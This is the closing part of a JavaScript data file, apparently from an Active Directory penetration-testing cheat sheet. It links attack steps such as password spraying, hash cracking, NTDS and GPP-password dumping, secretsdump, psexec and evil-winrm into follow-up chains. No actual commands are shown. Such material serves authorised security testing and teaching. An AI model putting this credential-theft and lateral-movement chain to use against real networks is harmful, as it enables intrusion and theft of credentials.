    "hashcat-ntlmv2"
  ],
  "nxc-ldap-raisechild": [
    "psexec",
    "secretsdump"
  ],
  "hashcat-ntlmv2": [
    "nxc-smb-auth",
    "evil-winrm"
  ],
  "hashcat-asrep": [
    "nxc-smb-auth",
    "evil-winrm"
  ],
  "hashcat-mscache": [
    "nxc-smb-auth"
  ],
  "kerbrute-spray": [
    "secretsdump",
    "evil-winrm"
  ],
  "nxc-smb-spray": [
    "secretsdump",
    "evil-winrm"
  ],
  "nxc-smb-wdigest": [
    "secretsdump"
  ],
  "nxc-ldap-laps": [
    "evil-winrm",
    "psexec"
  ],
  "nxc-smb-gpp-password": [
    "nxc-smb-auth",
    "evil-winrm"
  ],
  "nxc-smb-ntds": [
    "secretsdump",
    "hashcat-ntlm"
  ]
};

if (typeof module !== "undefined" && module.exports) {
  module.exports = { COMMAND_DATA, COMMAND_LINKS };
} else {
  window.COMMAND_LINKS = COMMAND_LINKS;
}
